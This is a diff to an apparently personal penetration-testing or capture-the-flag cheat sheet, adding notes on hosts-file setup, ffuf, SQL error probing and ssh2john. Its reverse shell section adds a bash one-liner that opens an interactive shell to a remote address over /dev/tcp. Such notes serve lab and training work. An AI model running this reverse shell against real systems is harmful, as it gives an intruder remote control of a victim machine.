@@ -23,6 +23,12 @@
 * vim/markdown
 
 ### Scouting
+
+* Add Target Domain to /etc/hosts so you can reach it
+   ```bash
+   sudo vim /etc/hosts
+   ```
+
 * Metasploit (Exploits)
    ```sh
    # search for exploits / cve's regarding given tool
@@ -79,12 +85,20 @@
    gobuster dir -u <target-machine-ip> -w <word-list>
    ```
 
+* ffuf
+    * can search for subdomains
+
+### SQL Injection
+
+* Check Return Codes (Network Tab) if you can produce SQL / Server Internal Errors
+
 ### BruteForcing
 * hydra
     * can bruteforce urls with requests
 * john
     * can identify hashes, brute force files (like shadow)
 * ssh2john
+    * can convert ssh keys so that john can read them
 
 ### Wordlists
 * /usr/share/wordlists
@@ -98,8 +112,10 @@
 ### ReverseShell
 * netcat
    ```sh
-   nc -lnvp <listening_port>
+   nc -lnvp <listening_port> # host
+   bash -c 'bash -i >& /dev/tcp/10.9.0.203/4000 0>&1 2>&1' # client
    ```
+
 * simple http webserver
    ```sh
    python3 -m http.server <listening_port>
